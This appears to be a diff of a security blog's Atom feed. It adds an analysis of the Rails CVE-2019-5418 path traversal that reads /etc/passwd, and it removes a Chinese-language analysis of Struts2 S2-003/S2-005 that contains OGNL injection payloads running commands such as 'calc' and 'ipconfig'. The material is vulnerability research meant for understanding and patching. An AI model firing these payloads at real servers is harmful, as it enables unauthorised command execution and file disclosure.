@@ -231,12 +231,53 @@
     
     </summary>
     
-      <category term="随笔" scheme="http://chybeta.github.io/categories/%E9%9A%8F%E7%AC%94/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>Analysis for【CVE-2019-5418】File Content Disclosure on Rails</title>
+    <link href="http://chybeta.github.io/2019/03/16/Analysis-for%E3%80%90CVE-2019-5418%E3%80%91File-Content-Disclosure-on-Rails/"/>
+    <id>http://chybeta.github.io/2019/03/16/Analysis-for【CVE-2019-5418】File-Content-Disclosure-on-Rails/</id>
+    <published>2019-03-16T02:34:38.000Z</published>
+    <updated>2019-03-16T02:52:42.106Z</updated>
+    
+    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/4448" target="_blank" rel="external">Chinese Edition: Ruby on Rails 路径穿越与任意文件读取漏洞分析 - 【CVE-2019-5418】</a><br><a id="more"></a></p>
+<h1 id="Security-Advisory"><a href="#Security-Advisory" class="headerlink" title="Security Advisory"></a>Security Advisory</h1><p><a href="https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q" target="_blank" rel="external">https://groups.google.com/forum/#!topic/rubyonrails-security/pFRKI96Sm8Q</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190315/4.jpg?raw=true" alt=""></p>
+<h1 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h1><p>The render method can use a view that’s entirely outside of your application. So in <code>actionview-5.2.1/lib/action_view/renderer/template_renderer.rb:22</code>, it will call <code>find_file</code> to determine which template to be rendered。<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">module</span> <span class="title">ActionView</span>   </span></div><div class="line">  <span class="class"><span class="keyword">class</span> <span class="title">TemplateRenderer</span> &lt; AbstractRenderer <span class="comment">#:nodoc:</span></span></div><div class="line">    <span class="comment"># Determine the template to be rendered using the given options.</span></div><div class="line">      <span class="function"><span class="keyword">def</span> <span class="title">determine_template</span><span class="params">(options)</span></span></div><div class="line">        keys = options.has_key?(<span class="symbol">:locals</span>) ? options[<span class="symbol">:locals</span>].keys : []</div><div class="line">        <span class="keyword">if</span> options.key?(<span class="symbol">:body</span>)</div><div class="line">          ...</div><div class="line">        <span class="keyword">elsif</span> options.key?(<span class="symbol">:file</span>)</div><div class="line">          with_fallbacks &#123; find_file(options[<span class="symbol">:file</span>], <span class="literal">nil</span>, <span class="literal">false</span>, keys, @details) &#125;</div><div class="line">        ...</div><div class="line">      <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>In the <code>find_file</code> method:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_file</span><span class="params">(name, prefixes = [], partial = <span class="literal">false</span>, keys = [], options = &#123;&#125;)</span></span></div><div class="line">    @view_paths.find_file(*args_for_lookup(name, prefixes, partial, keys, options))</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>step into  <code>args_for_lookup</code> method which to generate the options. When it returns, our payload will be saved in <code>details[formats]</code> :<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190315/args_for_lookup.jpg?raw=true" alt=""></p>
+<p>then it will execute <code>@view_paths.find_file</code> which located in <code>actionview-5.2.1/lib/action_view/path_set.rb</code>：<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PathSet</span> <span class="comment">#:nodoc:</span></span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_file</span><span class="params">(path, prefixes = [], *args)</span></span></div><div class="line">      _find_all(path, prefixes, args, <span class="literal">true</span>).first <span class="params">||</span> raise(MissingTemplate.new(<span class="keyword">self</span>, path, prefixes, *args))</div><div class="line">    <span class="keyword">end</span></div><div class="line">    private</div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">_find_all</span><span class="params">(path, prefixes, args, outside_app)</span></span></div><div class="line">            prefixes = [prefixes] <span class="keyword">if</span> String === prefixes</div><div class="line">            prefixes.each <span class="keyword">do</span> <span class="params">|prefix|</span></div><div class="line">            paths.each <span class="keyword">do</span> <span class="params">|resolver|</span></div><div class="line">                <span class="keyword">if</span> outside_app</div><div class="line">                  templates = resolver.find_all_anywhere(path, prefix, *args)</div><div class="line">                <span class="keyword">else</span></div><div class="line">                  templates = resolver.find_all(path, prefix, *args)</div><div class="line">                <span class="keyword">end</span></div><div class="line">                <span class="keyword">return</span> templates unless templates.empty?</div><div class="line">            <span class="keyword">end</span></div><div class="line">            <span class="keyword">end</span></div><div class="line">            []</div><div class="line">        <span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>Because the view is outside of your application，so <code>outside_app</code> equals<code>True</code> and then will call <code>find_all_anywhere</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">find_all_anywhere</span><span class="params">(name, prefix, partial = <span class="literal">false</span>, details = &#123;&#125;, key = <span class="literal">nil</span>, locals = [])</span></span></div><div class="line">    cached(key, [name, prefix, partial], details, locals) <span class="keyword">do</span></div><div class="line">    find_templates(name, prefix, partial, details, <span class="literal">true</span>)</div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>Skip <code>cached</code> part， the <code>find_templates</code> will according the options to find the template to render:</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"> <span class="comment"># An abstract class that implements a Resolver with path semantics.</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">PathResolver</span> &lt; Resolver <span class="comment">#:nodoc:</span></span></div><div class="line">    EXTENSIONS = &#123; <span class="symbol">locale:</span> <span class="string">"."</span>, <span class="symbol">formats:</span> <span class="string">"."</span>, <span class="symbol">variants:</span> <span class="string">"+"</span>, <span class="symbol">handlers:</span> <span class="string">"."</span> &#125;</div><div class="line">    DEFAULT_PATTERN = <span class="string">":prefix/:action&#123;.:locale,&#125;&#123;.:formats,&#125;&#123;+:variants,&#125;&#123;.:handlers,&#125;"</span></div><div class="line"></div><div class="line">    ...</div><div class="line"></div><div class="line">    private</div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">find_templates</span><span class="params">(name, prefix, partial, details, outside_app_allowed = <span class="literal">false</span>)</span></span></div><div class="line">            path = Path.build(name, prefix, partial)</div><div class="line">            <span class="comment"># 注意 details 与 details[:formats] 的传入</span></div><div class="line">            query(path, details, details[<span class="symbol">:formats</span>], outside_app_allowed)</div><div class="line">        <span class="keyword">end</span></div><div class="line"></div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">query</span><span class="params">(path, details, formats, outside_app_allowed)</span></span></div><div class="line">            query = build_query(path, details)</div><div class="line">            template_paths = find_template_paths(query)</div><div class="line">            ...</div><div class="line">            <span class="keyword">end</span></div><div class="line">        <span class="keyword">end</span></div></pre></td></tr></table></figure>
+<p>After <code>build_query</code> , the variables ：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190315/2.jpg?raw=true" alt=""></p>
+<p>SO here we use <code>../</code> to make directory traversal，and use double    <code>{</code> to make sure  syntax right. After <code>File.expand_path</code> , the result is:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/etc/passwd&#123;&#123;&#125;,&#125;&#123;+&#123;&#125;,&#125;&#123;.&#123;raw,erb,html,builder,ruby,coffee,jbuilder&#125;,&#125;</div></pre></td></tr></table></figure>
+<p>so the <code>/etc/passwd</code> will be treated the template to be rended ，which lead to a  arbitrary file read attack.</p>
+<h1 id="Reproduce"><a href="#Reproduce" class="headerlink" title="Reproduce"></a>Reproduce</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190315/2.gif?raw=true" alt=""></p>
+<h1 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h1><p><a href="https://github.com/rails/rails/commit/f4c70c2222180b8d9d924f00af0c7fd632e26715" target="_blank" rel="external">https://github.com/rails/rails/commit/f4c70c2222180b8d9d924f00af0c7fd632e26715</a></p>
+<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20190315/3.jpg?raw=true" alt=""></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/4448&quot;&gt;Chinese Edition: Ruby on Rails 路径穿越与任意文件读取漏洞分析 - 【CVE-2019-5418】&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
     
     
-      <category term="web" scheme="http://chybeta.github.io/tags/web/"/>
+      <category term="ruby" scheme="http://chybeta.github.io/tags/ruby/"/>
     
-      <category term="pwn" scheme="http://chybeta.github.io/tags/pwn/"/>
+      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+      <category term="rails" scheme="http://chybeta.github.io/tags/rails/"/>
+    
+      <category term="路径穿越" scheme="http://chybeta.github.io/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/"/>
+    
+      <category term="任意文件读取" scheme="http://chybeta.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
     
   </entry>
   
@@ -297,16 +338,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="Nexus" scheme="http://chybeta.github.io/tags/Nexus/"/>
-    
-      <category term="RCE" scheme="http://chybeta.github.io/tags/RCE/"/>
     
   </entry>
   
@@ -362,16 +393,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="thinkphp" scheme="http://chybeta.github.io/tags/thinkphp/"/>
     
   </entry>
   
@@ -720,14 +741,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="源码阅读" scheme="http://chybeta.github.io/tags/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
-    
-      <category term="扫描器" scheme="http://chybeta.github.io/tags/%E6%89%AB%E6%8F%8F%E5%99%A8/"/>
-    
-      <category term="安全开发" scheme="http://chybeta.github.io/tags/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
     
   </entry>
   
@@ -763,18 +776,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="phpcms" scheme="http://chybeta.github.io/tags/phpcms/"/>
     
   </entry>
   
@@ -809,16 +810,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="漏洞分析" scheme="http://chybeta.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    
-      <category term="XSS" scheme="http://chybeta.github.io/tags/XSS/"/>
-    
-      <category term="Discuz" scheme="http://chybeta.github.io/tags/Discuz/"/>
     
   </entry>
   
@@ -927,14 +918,6 @@
     
     </summary>
     
-      <category term="编程之美" scheme="http://chybeta.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
-    
-    
-      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
-    
-      <category term="requests" scheme="http://chybeta.github.io/tags/requests/"/>
-    
-      <category term="源码阅读" scheme="http://chybeta.github.io/tags/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
     
   </entry>
   
@@ -1157,14 +1140,6 @@
     
     </summary>
     
-      <category term="编程之美" scheme="http://chybeta.github.io/categories/%E7%BC%96%E7%A8%8B%E4%B9%8B%E7%BE%8E/"/>
-    
-    
-      <category term="python" scheme="http://chybeta.github.io/tags/python/"/>
-    
-      <category term="源码阅读" scheme="http://chybeta.github.io/tags/%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB/"/>
-    
-      <category term="pip-pop" scheme="http://chybeta.github.io/tags/pip-pop/"/>
     
   </entry>
   
@@ -1213,18 +1188,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="php" scheme="http://chybeta.github.io/tags/php/"/>
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="getshell" scheme="http://chybeta.github.io/tags/getshell/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="destoon" scheme="http://chybeta.github.io/tags/destoon/"/>
     
   </entry>
   
@@ -1285,16 +1248,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="ruby" scheme="http://chybeta.github.io/tags/ruby/"/>
-    
-      <category term="gitlab" scheme="http://chybeta.github.io/tags/gitlab/"/>
     
   </entry>
   
@@ -1374,16 +1327,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
-    
-      <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
     
   </entry>
   
@@ -1434,18 +1377,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="ruby" scheme="http://chybeta.github.io/tags/ruby/"/>
-    
-      <category term="任意文件读取" scheme="http://chybeta.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
-    
-      <category term="rails" scheme="http://chybeta.github.io/tags/rails/"/>
-    
-      <category term="路径穿越" scheme="http://chybeta.github.io/tags/%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A/"/>
     
   </entry>
   
@@ -1644,18 +1575,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="RCE" scheme="http://chybeta.github.io/tags/RCE/"/>
-    
-      <category term="opentsdb" scheme="http://chybeta.github.io/tags/opentsdb/"/>
-    
-      <category term="远程命令执行" scheme="http://chybeta.github.io/tags/%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
     
   </entry>
   
@@ -1708,16 +1627,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="Jenkins" scheme="http://chybeta.github.io/tags/Jenkins/"/>
-    
-      <category term="任意文件读取" scheme="http://chybeta.github.io/tags/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"/>
     
   </entry>
   
@@ -1763,16 +1672,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="文件上传" scheme="http://chybeta.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="weblogic" scheme="http://chybeta.github.io/tags/weblogic/"/>
     
   </entry>
   
@@ -1827,16 +1726,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="xxe" scheme="http://chybeta.github.io/tags/xxe/"/>
-    
-      <category term="apache" scheme="http://chybeta.github.io/tags/apache/"/>
-    
-      <category term="solr" scheme="http://chybeta.github.io/tags/solr/"/>
     
   </entry>
   
@@ -1930,14 +1819,6 @@
     
     </summary>
     
-      <category term="Bin Security" scheme="http://chybeta.github.io/categories/Bin-Security/"/>
-    
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="git" scheme="http://chybeta.github.io/tags/git/"/>
-    
-      <category term="submodule" scheme="http://chybeta.github.io/tags/submodule/"/>
     
   </entry>
   
@@ -1986,16 +1867,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
-    
-      <category term="加压缩" scheme="http://chybeta.github.io/tags/%E5%8A%A0%E5%8E%8B%E7%BC%A9/"/>
     
   </entry>
   
@@ -2057,82 +1928,6 @@
     
     </summary>
     
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码审计" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
-    
-      <category term="java" scheme="http://chybeta.github.io/tags/java/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="spring" scheme="http://chybeta.github.io/tags/spring/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005</title>
-    <link href="http://chybeta.github.io/2018/05/08/%E3%80%90struts2-%E5%91%BD%E4%BB%A4-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E3%80%91S2-003%E5%92%8CS3-005/"/>
-    <id>http://chybeta.github.io/2018/05/08/【struts2-命令-代码执行漏洞分析系列】S2-003和S3-005/</id>
-    <published>2018-05-07T23:45:08.000Z</published>
-    <updated>2018-05-07T23:58:28.897Z</updated>
-    
-    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/2323" target="_blank" rel="external">阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005</a><br><a id="more"></a></p>
-<h1 id="S2-003"><a href="#S2-003" class="headerlink" title="S2-003"></a>S2-003</h1><h2 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞信息页面： <a href="https://cwiki.apache.org/confluence/display/WW/S2-003" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-003</a></p>
-<p>漏洞成因官方概述：XWork ParameterInterceptors bypass allows OGNL statement execution</p>
-<p>漏洞影响：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/1.png?raw=true" alt=""></p>
-<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>s2-003漏洞的payload用到了特殊字符，在高版本tomcat中会失败，需要使用tomcat6来测试。我使用的是6.0.9版本。此外导入的struts版本为2.0.11.2</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>POC:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
-<p>回显：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023_memberAccess.excludeProperties\u003d@java.util.Collections@EMPTY_SET&apos;)(kxlzx)(kxlzx)&amp;(&apos;\u0023mycmd\u003d\&apos;ipconfig\&apos;&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\u0023mycmd)&apos;)(bla)(bla)&amp;(A)((&apos;\u0023mydat\u003dnew\40java.io.DataInputStream(\u0023myret.getInputStream())&apos;)(bla))&amp;(B)((&apos;\u0023myres\u003dnew\40byte[51020]&apos;)(bla))&amp;(C)((&apos;\u0023mydat.readFully(\u0023myres)&apos;)(bla))&amp;(D)((&apos;\u0023mystr\u003dnew\40java.lang.String(\u0023myres)&apos;)(bla))&amp;(&apos;\u0023myout\u003d@org.apache.struts2.ServletActionContext@getResponse()&apos;)(bla)(bla)&amp;(E)((&apos;\u0023myout.getWriter().println(\u0023mystr)&apos;)(bla))</div></pre></td></tr></table></figure></p>
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:177 获取到我们传入的参数</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/2.png?raw=true" alt=""></p>
-<p>在<code>getValueStack</code>之前，执行了一些初始化操作，比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">OgnlContextState.setDenyMethodExecution(contextMap, true);</div></pre></td></tr></table></figure></p>
-<p>将<code>xwork.MethodAccessor.denyMethodExecution</code>设置为<code>true</code>。为了能够调用方法，需要在poc中的第一部分将<code>denyMethodExecution</code>设置为<code>false</code>，之后才能任意代码执行。</p>
-<p>跟入<code>setParameters(action, stack, parameters);</code>至 struts/struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:201。此部分开始通过迭代器取出一个个传入的参数，并进行处理。</p>
-<p>假设此时我传入的参数如下，注意这个与poc的不同在于，我将第一个<code>\u0023</code>替换成了<code>#</code>。：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;#context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003dfalse&apos;)(bla)(bla)&amp;(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/3.png?raw=true" alt=""></p>
-<p>跟入<code>acceptableName</code>至 struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/interceptor/ParametersInterceptor.java:271<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">boolean</span> <span class="title">acceptableName</span><span class="params">(String name)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span> (isAccepted(name) &amp;&amp; !isExcluded(name)) &#123;</div><div class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>跟入<code>isAccepted(name)</code><br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/4.png?raw=true" alt=""></p>
-<p>这里通过简单的正则表达式<code>[\p{Graph}&amp;&amp;[^,#:=]]*</code>来检测，防止传入恶意特殊字符开头如<code>#</code>等。因此<code>acceptableName</code>返回false，接下来的ognl表达式自然也不会执行了。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> (acceptableName) &#123;</div><div class="line">    Object value = entry.getValue();</div><div class="line">    ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>但如果传入经过编码后的payload。<code>#</code>对应的unicode为<code>\u0023</code>，八进制为<code>\43</code>，则可以绕过上述的检测，也即导致<code>acceptableName</code>为true，从而进一步执行。</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/5.png?raw=true" alt=""></p>
-<p>在设置<code>denyMethodExecution</code>为false后，poc的第二部分就是通过方法调用来执行任意命令了：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023myret\u003d@java.lang.Runtime@getRuntime().exec(\&apos;calc\&apos;)&apos;)(bla)(bla)</div></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/6.png?raw=true" alt=""></p>
-<h1 id="S2-005"><a href="#S2-005" class="headerlink" title="S2-005"></a>S2-005</h1><h2 id="漏洞信息-1"><a href="#漏洞信息-1" class="headerlink" title="漏洞信息"></a>漏洞信息</h2><p>漏洞信息页面： <a href="https://cwiki.apache.org/confluence/display/WW/S2-005" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-005</a></p>
-<p>漏洞成因官方概述：XWork ParameterInterceptors bypass allows remote command execution</p>
-<p>漏洞影响：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/7.png?raw=true" alt=""></p>
